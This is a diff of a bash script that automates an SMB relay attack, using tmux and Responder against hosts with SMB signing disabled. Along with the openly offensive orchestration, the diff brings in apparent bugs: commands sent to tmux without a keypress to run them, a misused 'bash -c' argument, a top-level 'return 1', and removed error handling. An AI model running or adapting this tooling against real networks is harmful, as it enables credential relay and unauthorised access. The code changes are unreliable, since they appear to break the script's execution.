@@ -12,7 +12,6 @@ responder_config_file="${RESPONDER_CONF:-/etc/responder/Responder.conf}"
 session_name="smb_relay_attack"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
-AUTO_MODE=false
 SESSION_CREATED=false
 
 RUN_ID=$(date +%s)
@@ -76,7 +75,7 @@ log() {
     local msg="$2"
 
     echo -e "[$level] $msg"
-    echo "[$level] $(echo -e "$msg" | sed 's/\x1b\[[0-9;]*m//g')" >> "$ATTACK_LOG"
+    echo "[$level] $(echo "$msg" | sed -r 's/\x1B\[[0-9;]*[mK]//g')" >> "$ATTACK_LOG"
 }
 
 # Check if a tool is installed
@@ -143,30 +142,23 @@ start_tmux_window() {
     local command=$3
 
     # Only responsibility: manage windows + send commands
-
     if ! tmux list-windows -t "$session_name" 2>/dev/null | grep -qw "$window_name"; then
         tmux new-window -t "$session_name" -n "$window_name"
     fi
 
-    tmux send-keys -t "$session_name:$window_name" "$command"
-    tmux send-keys -t "$session_name:$window_name" C-m
+    tmux send-keys -t "$session_name:$window_name" bash -c "$command"
 }
 
 # Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
-    log INFO "${BLUE}[*] Starting SMB Relay Attack...${RESET}"
-
     # Ensure tmux session exists
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
-        log SUCCESS "${GREEN}[+] Creating tmux session: $session_name.${RESET}"
-    
-        tmux new-session -d -s "$session_name" || {
-            log ERROR "Failed to create tmux session"
-            exit 1
-        }
-    
+        log SUCCESS "${GREEN}[+] Creating tmux session: $session_name.${RESET}"    
+        tmux new-session -d -s "$session_name"
         SESSION_CREATED=true
     fi
+
+    log INFO "${BLUE}[*] Starting SMB Relay Attack...${RESET}"
 
     # Start Responder in a tmux window
     log INFO "${CYAN}Starting Responder on interface $network_interface...${RESET}"
@@ -284,6 +276,7 @@ if [ -s "${TARGET_SMB_FILE}" ]; then
     edit_responder_conf
     sleep 3
     run_smb_relay_attack
+    return 1
 else
     log ERROR "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
     exit 0
